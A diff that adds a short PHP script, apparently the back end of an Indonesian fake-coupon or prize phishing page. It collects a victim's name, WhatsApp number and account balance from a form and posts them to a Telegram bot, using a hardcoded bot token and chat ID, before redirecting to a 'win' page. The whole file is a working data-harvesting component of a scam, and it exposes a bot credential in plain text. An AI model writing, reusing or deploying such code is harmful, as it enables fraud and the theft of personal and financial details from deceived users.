@@ -1,0 +1,32 @@
+<?php
+$token   = "8165436726:AAEvXYC7a9YmS43Ju0jNDJEqJHHVMgGYBYQ";
+$chat_id = "6704231023";
+$nama  = htmlspecialchars($_POST['nama']);
+$nowa  = htmlspecialchars($_POST['nowa']);
+$saldo = htmlspecialchars($_POST['saldo']);
+$text = "📩 *Data Kupon Masuk:*\n";
+$text .= "*Nama:* $nama\n";
+$text .= "*WhatsApp:* $nowa\n";
+$text .= "*Saldo Akhir:* $saldo";
+$url = "https://api.telegram.org/bot$token/sendMessage";
+$data = [
+    'chat_id' => $chat_id,
+    'text' => $text,
+    'parse_mode' => 'Markdown'
+];
+$options = [
+    'http' => [
+        'method'  => 'POST',
+        'header'  => "Content-Type:application/x-www-form-urlencoded",
+        'content' => http_build_query($data)
+    ]
+];
+$context = stream_context_create($options);
+$result  = file_get_contents($url, false, $context);
+if ($result) {
+    header("Location: win.html");
+    exit();
+} else {
+    echo "Gagal mengirim ke Telegram.";
+}
+?>
